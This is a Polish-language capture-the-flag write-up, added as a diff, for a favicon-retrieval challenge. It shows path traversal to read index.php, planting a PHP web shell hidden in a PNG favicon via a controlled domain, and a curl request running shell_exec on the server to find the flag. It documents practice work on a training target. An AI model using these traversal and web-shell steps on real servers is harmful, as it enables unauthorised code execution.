@@ -1,0 +1,13 @@
+Title:
+These are the few of my favourite icons
+Description:
+My lightning-fast, military-grade-secure website can retrieve any favicon in no time, with no security implications at all. Just try and prepare to be struck by its awesomeness! I'm gonna get all of your favicons and you can't do nothing about it!!!11!
+
+
+W tym zadaniu dostawaliśmy link do strony. Od razu dostawaliśmy komunikat "Required "domain" parameter". Oznacza to że musimy podać parametr GET o nazwie domain. Skoro nazywa się domain to dobrym pomysłem jest podanie mu nazwy jakiejś domeny np google.com. Jeśli to zrobimy to otrzymamy favicon strony google.com. Jeśli jednak podamy np ../index.php to otrzymamy zawartość tego pliku.(można dość bezpiecznie założyć, że taki plik znajduje się na serwerze - alternatywną możliwością jest index.html) Po analizie kodu znajdującego się w tym pliku można dojść do kilku wniosków. Jeśli w folderze icons istnieje plik o nazwie takiej jak parametr domain to jest on odczytywany i zwracany jako obraz png. Dzięki temu podając ../index.php dostajemy ścieżkę icons/../index.php, która istnieje, więc plik index.php jest nam zwracany jako png. 
+Jeśli podany plik nie istnieje to wykonywane jest żądanie do https://www.google.com/s2/favicons?domain= z tym samym parametrem domain. Strona ta odpytuje podaną domenę o favicon i zwraca go w formacie png. Następnie otrzymany png jest zapisywany do folderu icons pod podaną nazwą domeny oraz jest wyświetlany. Daje to nam możliwość zapisania na serwerze pliku o dowolnym rozszerzeniu, ponieważ możemy podać na przykład google.com/../exploit.php i zwrócony favicon zostanie zapisany jako exploit.php. Zamiast google.com możemy podać kontrolowaną przez siebie domenę, dzięki czemu na serwerze zapisany zostanie kontrolowany przez nas favicon. Ostatnim problemem do obejścia jest przygotowanie takiego pliku favicon.ico, który po skonwertowaniu do formatu png będzie zawierał kod PHP. Posiłkowałem się tutaj tym wpisem: https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/
+Gotowy favicon.ico znajduje się w tym repozytorium. 
+Na koniec, aby zapisać nasz favicon na serwerze wykonujemy żądanie: https://ctf.whitehats.pwr.edu.pl/1f15fa96bc5c676f56787533cb002275017cc624/?domain=naszadomena/../exploit.php gdzie za naszadomena podstawiamy kontrolowaną przez nas domenę(ja użyłem do jej stworzenia programu ngrok). Następnie aby wykonać komendę na serwerze wykonujemy żądanie przy użyciu komendy curl: curl -v -k --output - https://ctf.whitehats.pwr.edu.pl/1f15fa96bc5c676f56787533cb002275017cc624/icons/exploit.php?0=shell_exec --data "1=ls -al"
+Daje nam to listing plików na serwerze. Jeśli wykonamy "ls ../../" to zobaczymy plik flag.txt. Na koniec wystarczy go odczytać i mamy flagę.
+
+
